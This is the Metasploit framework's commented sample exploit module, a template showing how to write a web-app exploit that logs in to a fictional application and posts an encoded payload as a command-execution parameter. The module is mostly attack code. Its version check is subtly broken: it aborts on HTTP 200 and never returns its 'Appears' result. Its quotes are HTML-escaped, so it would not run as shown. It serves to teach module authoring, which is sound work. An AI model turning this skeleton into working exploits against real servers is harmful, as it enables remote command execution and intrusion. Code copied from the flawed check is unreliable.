# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in an arbitrary web server
#
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  #
  # This exploit affects a webapp, so we need to import HTTP Client
  # to easily interact with it.
  #
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        # The Name should be just like the line of a Git commit - software name,
        # vuln type, class. Preferably apply
        # some search optimization so people can actually find the module.
        # We encourage consistency between module name and file name.
        &#039;Name&#039;           => &#039;Sample Webapp Exploit&#039;,
        &#039;Description&#039;    => %q(
            This exploit module illustrates how a vulnerability could be exploited
          in a webapp.
        ),
        &#039;License&#039;        => MSF_LICENSE,
        # The place to add your name/handle and email.  Twitter and other contact info isn&#039;t handled here.
        # Add reference to additional authors, like those creating original proof of concepts or
        # reference materials.
        # It is also common to comment in who did what (PoC vs metasploit module, etc)
        &#039;Author&#039;         =>
          [
            &#039;h00die <mike@stcyrsecurity.com>&#039;, # msf module
            &#039;researcher&#039; # original PoC, analysis
          ],
        &#039;References&#039;     =>
          [
            [ &#039;OSVDB&#039;, &#039;12345&#039; ],
            [ &#039;EDB&#039;, &#039;12345&#039; ],
            [ &#039;URL&#039;, &#039;http://www.example.com&#039;],
            [ &#039;CVE&#039;, &#039;1978-1234&#039;]
          ],
        # platform refers to the type of platform.  For webapps, this is typically the language of the webapp.
        # js, php, python, nodejs are common, this will effect what payloads can be matched for the exploit.
        # A full list is available in lib/msf/core/payload/uuid.rb
        &#039;Platform&#039;       => [&#039;python&#039;],
        # from lib/msf/core/module/privileged, denotes if this requires or gives privileged access
        &#039;Privileged&#039;     => false,
        # from underlying architecture of the system.  typically ARCH_X64 or ARCH_X86, but for webapps typically
        # this is the application language. ARCH_PYTHON, ARCH_PHP, ARCH_JAVA are some examples
        # A full list is available in lib/msf/core/payload/uuid.rb
        &#039;Arch&#039;           => ARCH_PYTHON,
        &#039;Targets&#039;        =>
          [
            [ &#039;Automatic Target&#039;, {}]
          ],
        &#039;DisclosureDate&#039; => "Apr 1 2013",
        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.
        # It&#039;s generally easiest just to put the default at the beginning of the list and skip this
        # entirely.
        &#039;DefaultTarget&#039;  => 0
      )
    )
    # set the default port, and a URI that a user can set if the app isn&#039;t installed to the root
    register_options(
      [
        Opt::RPORT(80),
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;User to login with&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Password to login with&#039;, &#039;123456&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The URI of the Example Application&#039;, &#039;/example/&#039;])
      ], self.class
    )
  end

  #
  # The sample exploit checks the index page to verify the version number is exploitable
  # we use a regex for the version number
  #
  def check
    # we want to handle cases where the port/target isn&#039;t open/listening gracefully
    begin
      # only catch the response if we&#039;re going to use it, in this case we do for the version
      # detection.
      res = send_request_cgi(
        &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;method&#039;    => &#039;GET&#039;
      )
      # gracefully handle if res comes back as nil, since we&#039;re not guaranteed a response
      # also handle if we get an unexpected HTTP response code
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code == 200

      # here we&#039;re looking through html for the version string, similar to:
      # Version 1.2
      /Version: (?<version>[\d]{1,2}\.[\d]{1,2})<\/td>/ =~ res.body

      if version && Gem::Version.new(version) <= Gem::Version.new(&#039;1.3&#039;)
        vprint_good("Version Detected: #{version}")
        Exploit::CheckCode::Appears
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
    Exploit::CheckCode::Safe
  end

  #
  # The exploit method attempts a login, then attempts to throw a command execution
  # at a web page through a POST variable
  #
  def exploit
    begin
      # attempt a login. In this case we show basic auth, and a POST to a fake username/password
      # simply to show how both are done
      vprint_status(&#039;Attempting login&#039;)
      # since we will check res to see if auth was a success, make sure to capture the return
      res = send_request_cgi(
        &#039;uri&#039;           => &#039;/login.html&#039;,
        &#039;method&#039;        => &#039;POST&#039;,
        &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]),
        &#039;vars_post&#039;     => {
          &#039;username&#039; => datastore[&#039;USERNAME&#039;],
          &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
        }
      )

      # a valid login will give us a 301 redirect to /home.html so check that.
      # ALWAYS assume res could be nil and check it first!!!!!
      if res && res.code != 301
        fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})")
      end

      # grab our valid cookie
      cookie = res.get_cookies
      # we don&#039;t care what the response is, so don&#039;t bother saving it from send_request_cgi
      vprint_status(&#039;Attempting exploit&#039;)
      send_request_cgi(
        &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;command.html&#039;),
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;cookie&#039;    => cookie,
        &#039;vars_post&#039;  =>
        {
          &#039;cmd_str&#039; => payload.encoded
        }
      )

    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end

  end
end

